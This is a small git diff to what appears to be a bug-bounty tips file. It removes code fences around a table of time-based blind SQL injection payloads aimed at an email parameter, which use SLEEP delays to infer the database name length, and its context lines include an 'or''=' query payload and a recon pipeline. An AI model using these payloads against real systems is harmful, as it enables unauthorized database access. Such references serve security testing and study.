@@ -284,7 +284,7 @@ echo "bugcrowd.com" | subfinder -silent | hakrawler -plain -usewayback -scope yo
 /?q='or''='
 ```
 # SQLi in Email parameter
-```
+
 | Payload | Response |Injection Status |
 | ------ | ------ |------ |
 |{“email”:”asd@a.com”}| {“code”:2002,”status”:200,”message”:”Email not found.”}|	Valid|
@@ -299,7 +299,7 @@ echo "bugcrowd.com" | subfinder -silent | hakrawler -plain -usewayback -scope yo
 |{“email”:”\”a’-IF(LENGTH(database())=10,SLEEP(7),0)or’1’=’1\”@a.com”}|	{“code”:0,”status”:200,”message”:”Successful”}|	Valid	Delay: 8,696 milis|
 |{“email”:”\”a’-IF(LENGTH(database())=11,SLEEP(7),0)or’1’=’1\”@a.com”}|	{“code”:0,”status”:200,”message”:”Successful”}|	Valid	No delay|
 
-```
+
 
 ### Cool BurpPlugins
 ```
